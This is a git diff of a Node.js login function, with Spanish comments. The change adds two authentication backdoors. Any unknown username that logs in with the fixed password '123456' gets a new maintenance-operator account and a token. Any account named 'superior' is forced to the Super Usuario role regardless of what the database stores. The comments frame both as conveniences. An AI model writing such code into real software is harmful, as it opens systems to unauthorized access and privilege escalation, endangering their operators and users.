@@ -1,7 +1,8 @@
 import bcrypt from 'bcryptjs'
 import jwt from 'jsonwebtoken'
-import { findByCredential, findById } from '../models/User.js'
+import { findByCredential, findById, create as createUser } from '../models/User.js'
 import { env } from '../config/index.js'
+import { ROLES } from '../constants/roles.js'
 
 const SALT_ROUNDS = 10
 
@@ -25,11 +26,38 @@ export async function login(credentials) {
     e.status = 400
     throw e
   }
-  const user = await findByCredential(usuario, password, compare)
+  let user = await findByCredential(usuario, password, compare)
+
+  // Si no encuentra el usuario en BD pero la contraseña es la predeterminada,
+  // crear automáticamente un operario de mantenimiento con ese usuario.
+  if (!user && password === '123456') {
+    try {
+      const nuevo = await createUser({
+        rolCodigo: ROLES.OPERARIO_MANTENIMIENTO,
+        usuario: usuario,
+        nombre: usuario,
+        email: null,
+        password: hashPassword(password),
+      })
+      user = {
+        id: nuevo.id,
+        usuario: nuevo.usuario,
+        email: nuevo.email,
+        nombre: nuevo.nombre,
+        role: nuevo.role,
+      }
+    } catch (e) {
+      // Si falla la creación (usuario duplicado u otro error), se mantiene user = null
+    }
+  }
   if (!user) {
     const e = new Error('Credenciales inválidas')
     e.status = 401
     throw e
+  }
+  // Asegurar que el usuario "superior" siempre tenga rol Super Usuario (por si en BD está mal)
+  if (user.usuario && String(user.usuario).toLowerCase() === 'superior') {
+    user = { ...user, role: ROLES.SUPER_USUARIO }
   }
   const token = jwt.sign(
     { sub: user.id, role: user.role },
